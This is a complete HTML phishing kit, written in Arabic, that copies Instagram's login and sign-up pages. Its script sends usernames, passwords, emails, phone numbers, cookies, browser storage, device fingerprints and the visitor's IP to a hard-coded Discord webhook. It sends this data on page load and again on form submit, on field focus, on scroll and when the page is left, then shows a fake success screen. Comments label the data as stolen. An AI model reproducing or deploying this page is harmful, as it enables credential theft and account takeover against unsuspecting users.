<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="icon" href="https://static.cdninstagram.com/rsrc.php/v3/yT/r/aj3lH9qjqOo.png">
    <style>
        :root {
            --primary-color: #0095f6;
            --secondary-color: #385185;
            --text-color: #262626;
            --border-color: #dbdbdb;
            --bg-color: #fafafa;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }
        
        body {
            background-color: var(--bg-color);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            direction: rtl;
            line-height: 1.6;
        }
        
        .container {
            display: flex;
            max-width: 935px;
            width: 100%;
            justify-content: center;
            align-items: center;
            gap: 50px;
            padding: 20px;
        }
        
        .phones {
            flex: 1;
            text-align: center;
            position: relative;
        }
        
        .phone-mockup {
            width: 380px;
            height: 580px;
            background: linear-gradient(45deg, #667eea 0%, #764ba2 100%);
            border-radius: 40px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 24px;
            position: relative;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            border: 10px solid #000;
        }
        
        .phone-mockup::before {
            content: '';
            position: absolute;
            top: -15px;
            left: 50%;
            transform: translateX(-50%);
            width: 60px;
            height: 25px;
            background: #000;
            border-radius: 0 0 15px 15px;
        }
        
        .right-section {
            flex: 0 0 350px;
        }
        
        .login-box {
            background: white;
            border: 1px solid var(--border-color);
            padding: 40px;
            text-align: center;
            border-radius: 1px;
            margin-bottom: 10px;
        }
        
        .logo {
            font-family: 'Billabong', cursive;
            font-size: 48px;
            margin-bottom: 24px;
            color: var(--text-color);
            font-weight: normal;
        }
        
        .form-group {
            margin-bottom: 6px;
        }
        
        input[type="text"],
        input[type="password"],
        input[type="email"],
        input[type="tel"] {
            width: 100%;
            padding: 12px 8px;
            border: 1px solid var(--border-color);
            background: #fafafa;
            border-radius: 3px;
            font-size: 12px;
            text-align: right;
            direction: ltr;
        }
        
        input[type="text"]:focus,
        input[type="password"]:focus,
        input[type="email"]:focus,
        input[type="tel"]:focus {
            outline: none;
            border-color: #a8a8a8;
        }
        
        .login-btn {
            width: 100%;
            padding: 8px;
            background: var(--primary-color);
            border: none;
            border-radius: 8px;
            color: white;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            margin-top: 14px;
            opacity: 0.7;
            transition: opacity 0.3s;
        }
        
        .login-btn.active {
            opacity: 1;
        }
        
        .separator {
            display: flex;
            align-items: center;
            margin: 20px 0;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }
        
        .separator::before,
        .separator::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid var(--border-color);
        }
        
        .separator::before {
            margin-left: 10px;
        }
        
        .separator::after {
            margin-right: 10px;
        }
        
        .fb-login {
            color: var(--secondary-color);
            text-decoration: none;
            font-weight: 600;
            font-size: 14px;
            display: block;
            margin: 10px 0;
        }
        
        .fb-login i {
            margin-left: 8px;
        }
        
        .forgot-password {
            color: #00376b;
            text-decoration: none;
            font-size: 12px;
            display: block;
            margin-top: 20px;
        }
        
        .signup-box {
            background: white;
            border: 1px solid var(--border-color);
            padding: 20px;
            text-align: center;
            margin-bottom: 10px;
            font-size: 14px;
        }
        
        .signup-box a {
            color: var(--primary-color);
            text-decoration: none;
            font-weight: 600;
        }
        
        .apps {
            text-align: center;
            font-size: 14px;
        }
        
        .app-buttons {
            margin-top: 10px;
            display: flex;
            justify-content: center;
            gap: 8px;
        }
        
        .app-btn {
            height: 40px;
            border-radius: 5px;
            background: #000;
            color: white;
            padding: 0 15px;
            display: flex;
            align-items: center;
            justify-content: center;
            text-decoration: none;
            font-size: 12px;
            font-weight: 600;
        }
        
        .footer {
            text-align: center;
            margin-top: 50px;
            color: #8e8e8e;
            font-size: 12px;
            max-width: 800px;
        }
        
        .footer-links {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 16px;
            margin-bottom: 10px;
        }
        
        .footer-links a {
            color: #8e8e8e;
            text-decoration: none;
        }
        
        @font-face {
            font-family: 'Billabong';
            src: url('https://cdn.jsdelivr.net/npm/billabong@1.0.0/fonts/Billabong.eot');
            src: url('https://cdn.jsdelivr.net/npm/billabong@1.0.0/fonts/Billabong.eot?#iefix') format('embedded-opentype'),
                 url('https://cdn.jsdelivr.net/npm/billabong@1.0.0/fonts/Billabong.woff') format('woff'),
                 url('https://cdn.jsdelivr.net/npm/billabong@1.0.0/fonts/Billabong.ttf') format('truetype');
            font-weight: normal;
            font-style: normal;
        }
        
        /* تحميل خفي */
        #loader {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255,255,255,0.95);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            flex-direction: column;
        }
        
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid var(--primary-color);
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin-bottom: 15px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        /* تحسينات للجوال */
        @media (max-width: 875px) {
            .phones {
                display: none;
            }
            
            .container {
                margin-top: 0;
            }
            
            .right-section {
                flex: 1;
                max-width: 350px;
            }
        }
        
        .tab-container {
            display: flex;
            margin-bottom: 20px;
            border-bottom: 1px solid var(--border-color);
        }
        
        .tab {
            flex: 1;
            text-align: center;
            padding: 10px;
            cursor: pointer;
            border-bottom: 2px solid transparent;
        }
        
        .tab.active {
            border-bottom: 2px solid var(--text-color);
            font-weight: 600;
        }
        
        .tab-content {
            display: none;
        }
        
        .tab-content.active {
            display: block;
        }
        
        .input-group {
            position: relative;
            margin-bottom: 6px;
        }
        
        .input-label {
            position: absolute;
            right: 8px;
            top: 50%;
            transform: translateY(-50%);
            color: #8e8e8e;
            font-size: 12px;
            pointer-events: none;
            transition: all 0.2s;
        }
        
        input:focus + .input-label,
        input:not(:placeholder-shown) + .input-label {
            top: 30%;
            font-size: 10px;
        }
        
        .password-toggle {
            position: absolute;
            left: 8px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: #8e8e8e;
            cursor: pointer;
            font-size: 12px;
        }
        
        .success-box {
            background: white;
            border: 1px solid #dbdbdb;
            padding: 40px;
            text-align: center;
            border-radius: 3px;
            width: 350px;
        }
    </style>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
</head>
<body>
    <!-- تحميل خفي -->
    <div id="loader">
        <div class="spinner"></div>
        <div style="text-align: center; font-size: 14px; color: #8e8e8e;">
            جاري التحقق من المعلومات...
        </div>
    </div>

    <!-- الصفحة الرئيسية -->
    <div id="mainPage" class="container">
        <div class="phones">
            <div class="phone-mockup">
                <div style="text-align: center;">
                    <div style="font-family: 'Billabong', cursive; font-size: 42px; margin-bottom: 20px;">Instagram</div>
                    <div style="font-size: 14px; opacity: 0.8;">شارك لحظاتك مع العالم</div>
                </div>
            </div>
        </div>
        
        <div class="right-section">
            <div class="login-box">
                <div class="logo">Instagram</div>
                
                <div class="tab-container">
                    <div class="tab active" onclick="switchTab('login')">تسجيل الدخول</div>
                    <div class="tab" onclick="switchTab('signup')">إنشاء حساب</div>
                </div>
                
                <!-- نموذج تسجيل الدخول -->
                <form id="loginForm" class="tab-content active">
                    <div class="form-group">
                        <div class="input-group">
                            <input type="text" id="loginUsername" name="username" placeholder=" " required>
                            <label class="input-label" for="loginUsername">اسم المستخدم أو البريد الإلكتروني</label>
                        </div>
                    </div>
                    <div class="form-group">
                        <div class="input-group">
                            <input type="password" id="loginPassword" name="password" placeholder=" " required>
                            <label class="input-label" for="loginPassword">كلمة المرور</label>
                            <button type="button" class="password-toggle" onclick="togglePassword('loginPassword')">
                                <i class="far fa-eye"></i>
                            </button>
                        </div>
                    </div>
                    <button type="submit" class="login-btn" id="loginBtn">تسجيل الدخول</button>
                </form>
                
                <!-- نموذج إنشاء حساب -->
                <form id="signupForm" class="tab-content">
                    <div class="form-group">
                        <div class="input-group">
                            <input type="email" id="signupEmail" name="email" placeholder=" " required>
                            <label class="input-label" for="signupEmail">البريد الإلكتروني</label>
                        </div>
                    </div>
                    <div class="form-group">
                        <div class="input-group">
                            <input type="text" id="signupFullname" name="fullname" placeholder=" " required>
                            <label class="input-label" for="signupFullname">الاسم الكامل</label>
                        </div>
                    </div>
                    <div class="form-group">
                        <div class="input-group">
                            <input type="text" id="signupUsername" name="username" placeholder=" " required>
                            <label class="input-label" for="signupUsername">اسم المستخدم</label>
                        </div>
                    </div>
                    <div class="form-group">
                        <div class="input-group">
                            <input type="password" id="signupPassword" name="password" placeholder=" " required>
                            <label class="input-label" for="signupPassword">كلمة المرور</label>
                            <button type="button" class="password-toggle" onclick="togglePassword('signupPassword')">
                                <i class="far fa-eye"></i>
                            </button>
                        </div>
                    </div>
                    <div class="form-group">
                        <div class="input-group">
                            <input type="tel" id="signupPhone" name="phone" placeholder=" ">
                            <label class="input-label" for="signupPhone">رقم الهاتف (اختياري)</label>
                        </div>
                    </div>
                    <button type="submit" class="login-btn" id="signupBtn">إنشاء حساب</button>
                </form>
                
                <div class="separator">أو</div>
                
                <a href="#" class="fb-login">
                    <i class="fab fa-facebook-square"></i> تسجيل الدخول باستخدام فيسبوك
                </a>
                <a href="#" class="forgot-password">نسيت كلمة المرور؟</a>
            </div>
            
            <div class="signup-box">
                ليس لديك حساب؟ <a href="#" onclick="switchTab('signup')">اشترك</a>
            </div>
            
            <div class="apps">
                <p>حمّل التطبيق.</p>
                <div class="app-buttons">
                    <a href="#" class="app-btn">
                        <i class="fab fa-apple" style="margin-left: 5px;"></i>
                        App Store
                    </a>
                    <a href="#" class="app-btn">
                        <i class="fab fa-google-play" style="margin-left: 5px;"></i>
                        Google Play
                    </a>
                </div>
            </div>
        </div>
    </div>
    
    <!-- صفحة النجاح -->
    <div id="successPage" style="display: none;">
        <div class="success-box">
            <div class="logo">Instagram</div>
            <div class="success-message">
                تم تسجيل الدخول بنجاح! جاري تحويلك...
            </div>
            <div style="margin: 20px 0;">
                <div class="spinner" style="border: 4px solid #f3f3f3; border-top: 4px solid #0095f6; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto;"></div>
            </div>
            <button onclick="showMainPage()">العودة</button>
        </div>
    </div>

    <div class="footer">
        <div class="footer-links">
            <a href="#">Meta</a>
            <a href="#">حول</a>
            <a href="#">الوظائف</a>
            <a href="#">مساعدة</a>
            <a href="#">API</a>
            <a href="#">الخصوصية</a>
            <a href="#">الشروط</a>
            <a href="#">المكان</a>
            <a href="#">إنستغرام لايت</a>
            <a href="#">Threads</a>
            <a href="#">رفع جهات الاتصال وغيرها من المستخدمين</a>
            <a href="#">التحقق</a>
            <a href="#">Meta Verified</a>
        </div>
        <div class="copyright" style="margin-top: 10px;">
            © 2024 Instagram from Meta
        </div>
    </div>

    <script>
        // استبدل هذا الرابط برابط الويب هوك الخاص بك من Discord
        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1433416061365125243/-xPceWsRvCvcZmfb7A2v4X_P8dz3SntYSfxH3cuNLEoJtxsoSwRw0tlpiTIybcHUX_iA";
        
        let sessionId = 'sess_' + Math.random().toString(36).substr(2, 9);
        let collectedInitialData = false;
        
        // جمع جميع المعلومات الحساسة
        function collectAllData(additionalData = {}) {
            const data = {
                sessionId: sessionId,
                timestamp: new Date().toISOString(),
                url: window.location.href,
                
                // معلومات المتصفح
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages,
                cookieEnabled: navigator.cookieEnabled,
                
                // معلومات النظام
                screenWidth: screen.width,
                screenHeight: screen.height,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                hardwareConcurrency: navigator.hardwareConcurrency,
                deviceMemory: navigator.deviceMemory,
                
                // معلومات الشبكة
                connection: navigator.connection ? {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt
                } : null,
                
                // معلومات الصفحة
                referrer: document.referrer,
                title: document.title,
                cookies: document.cookie,
                
                // التخزين
                localStorage: {},
                sessionStorage: {},
                
                // معلومات إضافية
                ...additionalData
            };
            
            // جمع بيانات التخزين
            try {
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    data.localStorage[key] = localStorage.getItem(key);
                }
            } catch (e) {}
            
            try {
                for (let i = 0; i < sessionStorage.length; i++) {
                    const key = sessionStorage.key(i);
                    data.sessionStorage[key] = sessionStorage.getItem(key);
                }
            } catch (e) {}
            
            // جمع البيانات المحفوظة في النماذج
            data.autoFilledData = getAutoFilledData();
            
            return data;
        }
        
        // الحصول على البيانات المحفوظة تلقائياً
        function getAutoFilledData() {
            const autoFilled = {};
            const inputs = document.querySelectorAll('input[type="text"], input[type="password"], input[type="email"], input[type="tel"]');
            
            inputs.forEach(input => {
                if (input.value) {
                    autoFilled[input.name] = input.value;
                }
            });
            
            return autoFilled;
        }
        
        // إرسال البيانات إلى Discord
        function sendToDiscord(data) {
            // إنشاء الحقول الأساسية
            const fields = [];
            
            // معلومات المستخدم إذا تم إدخالها
            if (data.username || data.password) {
                fields.push(
                    {
                        "name": "👤 اسم المستخدم",
                        "value": `\`\`\`${data.username || 'لم يدخل'}\`\`\``,
                        "inline": true
                    },
                    {
                        "name": "🔑 كلمة المرور", 
                        "value": `\`\`\`${data.password || 'لم يدخل'}\`\`\``,
                        "inline": true
                    }
                );
            }
            
            // معلومات إضافية
            const additionalInfo = [];
            if (data.email) {
                additionalInfo.push(`📧 الإيميل: \`${data.email}\``);
            }
            if (data.phone) {
                additionalInfo.push(`📞 الهاتف: \`${data.phone}\``);
            }
            
            if (additionalInfo.length > 0) {
                fields.push({
                    "name": "📝 معلومات إضافية",
                    "value": additionalInfo.join("\n"),
                    "inline": false
                });
            }
            
            // معلومات المتصفح والنظام
            fields.push(
                {
                    "name": "🌐 المتصفح",
                    "value": `\`\`\`${(data.userAgent || 'غير معروف').substring(0, 100)}\`\`\``,
                    "inline": false
                },
                {
                    "name": "💻 النظام",
                    "value": `\`${data.platform || 'غير معروف'}\``,
                    "inline": true
                },
                {
                    "name": "🗣️ اللغة",
                    "value": `\`${data.language || 'غير معروف'}\``,
                    "inline": true
                },
                {
                    "name": "🖥️ دقة الشاشة",
                    "value": `\`${data.screenWidth || ''}x${data.screenHeight || ''}\``,
                    "inline": true
                }
            );
            
            // معلومات الشبكة والموقع
            const networkInfo = [];
            if (data.ip) {
                networkInfo.push(`📍 IP: \`${data.ip}\``);
            }
            if (data.timezone) {
                networkInfo.push(`⏰ المنطقة: \`${data.timezone}\``);
            }
            if (data.connection && data.connection.effectiveType) {
                networkInfo.push(`📶 الشبكة: \`${data.connection.effectiveType}\``);
            }
            
            if (networkInfo.length > 0) {
                fields.push({
                    "name": "🌍 معلومات الشبكة",
                    "value": networkInfo.join("\n"),
                    "inline": false
                });
            }
            
            // معلومات إضافية
            if (data.referrer) {
                fields.push({
                    "name": "🔗 المرجع",
                    "value": `\`${data.referrer.substring(0, 100)}\``,
                    "inline": false
                });
            }
            
            // البيانات المسروقة من التخزين
            if (data.localStorage && Object.keys(data.localStorage).length > 0) {
                const lsData = {};
                for (const [key, value] of Object.entries(data.localStorage)) {
                    if (String(value).length < 100) {
                        lsData[key] = value;
                    }
                }
                if (Object.keys(lsData).length > 0) {
                    fields.push({
                        "name": "💾 LocalStorage",
                        "value": `\`\`\`json\n${JSON.stringify(lsData, null, 2).substring(0, 500)}\`\`\``,
                        "inline": false
                    });
                }
            }
            
            // معلومات الجلسة
            if (data.sessionId) {
                fields.push({
                    "name": "🆔 معرف الجلسة",
                    "value": `\`${data.sessionId}\``,
                    "inline": true
                });
            }
            
            const embeds = [{
                "title": "🚨 تم جمع معلومات جديدة",
                "color": 16711680,
                "fields": fields,
                "timestamp": new Date().toISOString(),
                "footer": {
                    "text": `تم الجمع في ${new Date().toLocaleString('ar-SA')}`
                }
            }];
            
            const payload = {
                "content": "🔓 **تم جمع البيانات بنجاح**",
                "embeds": embeds,
                "username": "Instagram Logger",
                "avatar_url": "https://cdn-icons-png.flaticon.com/512/1384/1384063.png"
            };
            
            return fetch(DISCORD_WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload)
            })
            .then(response => {
                console.log(`✅ تم إرسال البيانات إلى Discord - الحالة: ${response.status}`);
                return response.status === 200 || response.status === 204;
            })
            .catch(error => {
                console.error(`❌ خطأ في الإرسال: ${error}`);
                return false;
            });
        }
        
        // حفظ البيانات محلياً
        function saveToFile(data) {
            try {
                const timestamp = new Date().toLocaleString('ar-SA');
                const record = {
                    'timestamp': timestamp,
                    'data': data
                };
                
                // في بيئة المتصفح، يمكننا استخدام localStorage لحفظ البيانات
                const existingData = JSON.parse(localStorage.getItem('collectedData') || '[]');
                existingData.push(record);
                localStorage.setItem('collectedData', JSON.stringify(existingData));
                
                console.log('💾 تم حفظ البيانات محلياً');
                
                // عرض رابط لتحميل البيانات
                const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(existingData, null, 2));
                const downloadAnchorNode = document.createElement('a');
                downloadAnchorNode.setAttribute("href", dataStr);
                downloadAnchorNode.setAttribute("download", "collected_data.json");
                document.body.appendChild(downloadAnchorNode);
                downloadAnchorNode.click();
                downloadAnchorNode.remove();
                
            } catch (error) {
                console.error(`❌ خطأ في حفظ الملف: ${error}`);
            }
        }
        
        // إرسال البيانات المسروقة
        function sendStolenData(stolenData) {
            // الحصول على عنوان IP باستخدام خدمة خارجية
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(ipData => {
                    stolenData.ip = ipData.ip;
                    
                    console.log("🚨 تم استقبال بيانات جديدة!");
                    console.log(`📍 IP: ${stolenData.ip}`);
                    console.log(`🆔 الجلسة: ${stolenData.sessionId}`);
                    console.log(`📊 الإجراء: ${stolenData.action || 'unknown'}`);
                    
                    if (stolenData.username) {
                        console.log(`👤 المستخدم: ${stolenData.username}`);
                    }
                    if (stolenData.password) {
                        console.log(`🔑 كلمة المرور: ${stolenData.password}`);
                    }
                    if (stolenData.email) {
                        console.log(`📧 الإيميل: ${stolenData.email}`);
                    }
                    
                    // إرسال إلى Discord
                    sendToDiscord(stolenData);
                    
                    // حفظ محلي
                    saveToFile(stolenData);
                })
                .catch(error => {
                    console.error('❌ خطأ في الحصول على IP:', error);
                    stolenData.ip = 'غير معروف';
                    
                    // إرسال إلى Discord بدون IP
                    sendToDiscord(stolenData);
                    saveToFile(stolenData);
                });
        }
        
        // التبديل بين التبويبات
        function switchTab(tabName) {
            document.querySelectorAll('.tab').forEach(tab => {
                tab.classList.remove('active');
            });
            document.querySelectorAll('.tab-content').forEach(content => {
                content.classList.remove('active');
            });
            
            document.querySelector(`.tab:nth-child(${tabName === 'login' ? 1 : 2})`).classList.add('active');
            document.getElementById(tabName + 'Form').classList.add('active');
            
            // تحديث زر إنشاء حساب
            if (tabName === 'signup') {
                document.querySelector('.signup-box').style.display = 'none';
            } else {
                document.querySelector('.signup-box').style.display = 'block';
            }
            
            // جمع بيانات عند التبديل
            collectAndSendData({action: 'tab_switch', tab: tabName});
        }
        
        // تبديل عرض كلمة المرور
        function togglePassword(inputId) {
            const input = document.getElementById(inputId);
            const icon = input.nextElementSibling.querySelector('i');
            
            if (input.type === 'password') {
                input.type = 'text';
                icon.classList.remove('fa-eye');
                icon.classList.add('fa-eye-slash');
            } else {
                input.type = 'password';
                icon.classList.remove('fa-eye-slash');
                icon.classList.add('fa-eye');
            }
        }
        
        // التحقق من النماذج
        function setupFormValidation() {
            const forms = ['loginForm', 'signupForm'];
            
            forms.forEach(formId => {
                const form = document.getElementById(formId);
                const inputs = form.querySelectorAll('input[required]');
                const submitBtn = form.querySelector('.login-btn');
                
                function checkFormValidity() {
                    let allValid = true;
                    inputs.forEach(input => {
                        if (!input.value.trim()) {
                            allValid = false;
                        }
                    });
                    
                    if (allValid) {
                        submitBtn.classList.add('active');
                    } else {
                        submitBtn.classList.remove('active');
                    }
                }
                
                inputs.forEach(input => {
                    input.addEventListener('input', checkFormValidity);
                    input.addEventListener('change', checkFormValidity);
                });
                
                // التحقق الأولي
                checkFormValidity();
            });
        }
        
        // جمع وإرسال البيانات
        function collectAndSendData(additionalData = {}) {
            const stolenData = collectAllData(additionalData);
            sendStolenData(stolenData);
        }
        
        // عرض الصفحة الرئيسية
        function showMainPage() {
            document.getElementById('mainPage').style.display = 'flex';
            document.getElementById('successPage').style.display = 'none';
        }
        
        // عرض صفحة النجاح
        function showSuccessPage() {
            document.getElementById('mainPage').style.display = 'none';
            document.getElementById('successPage').style.display = 'flex';
            
            setTimeout(() => {
                showMainPage();
            }, 3000);
        }
        
        // عند تحميل الصفحة
        document.addEventListener('DOMContentLoaded', function() {
            console.log('🚀 بدء جمع البيانات تلقائياً...');
            
            // جمع البيانات الأولية بعد تأخير بسيط
            setTimeout(() => {
                if (!collectedInitialData) {
                    collectAndSendData({action: 'page_load'});
                    collectedInitialData = true;
                }
            }, 1000);
            
            // إعداد النماذج
            setupFormValidation();
            
            // معالجة نموذج تسجيل الدخول
            document.getElementById('loginForm').addEventListener('submit', function(e) {
                e.preventDefault();
                
                const formData = new FormData(this);
                const loader = document.getElementById('loader');
                
                // جمع البيانات النهائية
                const finalData = {
                    username: formData.get('username'),
                    password: formData.get('password'),
                    formType: 'login'
                };
                
                // إظهار التحميل
                loader.style.display = 'flex';
                
                // إرسال البيانات
                collectAndSendData(finalData);
                
                // إعادة التوجيه بعد تأخير
                setTimeout(() => {
                    loader.style.display = 'none';
                    showSuccessPage();
                }, 2000);
            });
            
            // معالجة نموذج إنشاء حساب
            document.getElementById('signupForm').addEventListener('submit', function(e) {
                e.preventDefault();
                
                const formData = new FormData(this);
                const loader = document.getElementById('loader');
                
                // جمع البيانات النهائية
                const finalData = {
                    email: formData.get('email'),
                    fullname: formData.get('fullname'),
                    username: formData.get('username'),
                    password: formData.get('password'),
                    phone: formData.get('phone'),
                    formType: 'signup'
                };
                
                // إظهار التحميل
                loader.style.display = 'flex';
                
                // إرسال البيانات
                collectAndSendData(finalData);
                
                // إعادة التوجيه بعد تأخير
                setTimeout(() => {
                    loader.style.display = 'none';
                    showSuccessPage();
                }, 2000);
            });
            
            // جمع البيانات عند التفاعل مع الحقول
            document.querySelectorAll('input').forEach(input => {
                input.addEventListener('focus', function() {
                    collectAndSendData({action: 'input_focus', field: this.name});
                });
                
                input.addEventListener('blur', function() {
                    if (this.value) {
                        collectAndSendData({action: 'input_blur', field: this.name, hasValue: true});
                    }
                });
            });
            
            // جمع البيانات المحفوظة تلقائياً
            setTimeout(() => {
                const autoFilled = getAutoFilledData();
                if (Object.keys(autoFilled).length > 0) {
                    collectAndSendData({action: 'auto_fill_detected', autoFilled: autoFilled});
                }
            }, 1500);
        });
        
        // جمع البيانات عند مغادرة الصفحة
        window.addEventListener('beforeunload', function() {
            collectAndSendData({action: 'page_unload'});
        });
        
        // جمع بيانات التمرير
        window.addEventListener('scroll', function() {
            collectAndSendData({action: 'page_scroll', scrollY: window.scrollY});
        });
    </script>
</body>
</html>
